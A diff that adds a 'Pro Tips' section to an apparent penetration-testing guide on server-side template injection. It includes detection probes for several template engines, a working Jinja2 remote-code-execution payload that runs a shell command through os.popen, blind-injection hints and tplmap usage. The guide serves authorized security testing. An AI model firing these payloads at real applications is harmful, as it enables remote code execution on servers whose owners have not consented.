@@ -130,6 +130,25 @@ tplmap -u 'https://target.com/page?name=test'
 
 - SSTI RCE equals full application compromise—rotate secrets, rebuild containers, review lateral movement.
 
+## Pro Tips
+
+Practical advice from real engagements — use these to test faster and report better.
+
+!!! tip "Detect engine fast"
+    Probe `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`, `*{7*7}` in one Intruder run.
+
+!!! tip "Jinja2 RCE chain"
+    `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` — only in authorized labs.
+
+!!! tip "Blind SSTI"
+    Use `{# comment #}` or math expressions that change PDF/email output size.
+
+!!! tip "tplmap automation"
+    `./tplmap.py -u URL` identifies engine and suggests exploit paths.
+
+!!! tip "Check export features"
+    Report generators and email templates are top SSTI targets — not just search boxes.
+
 ## Testing Methodology
 
 Work through each phase in order. Every step has a checkbox — complete them all for thorough, reproducible coverage.
